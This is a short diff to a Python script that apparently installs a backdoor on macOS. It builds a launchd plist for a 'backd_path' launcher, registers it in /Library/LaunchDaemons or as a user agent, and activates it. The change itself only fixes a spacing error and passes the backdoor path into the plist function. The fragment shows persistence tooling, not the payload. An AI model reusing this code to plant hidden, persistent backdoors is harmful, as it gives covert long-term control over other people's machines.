@@ -67,9 +67,9 @@ def plist_content(backd_path):
     <string>/dev/null</string>
 </dict>
 </plist>
-""".format(path_to_python, path_to_python,backd_path)
+""".format(path_to_python, path_to_python, backd_path)
 
-def generate_plist(method='daemon'):
+def generate_plist(backd_path, method='daemon'):
     if method == 'daemon':
         path_to_plist = "/Library/LaunchDaemons"
     elif method == 'agent':
@@ -105,7 +105,7 @@ def macosx():
     generate_launcher(launcher_path, backd_path)
 
     # Create plist
-    plist_path = generate_plist(plist_method)
+    plist_path = generate_plist(backd_path, plist_method)
     activate_plist(plist_path)
 
 
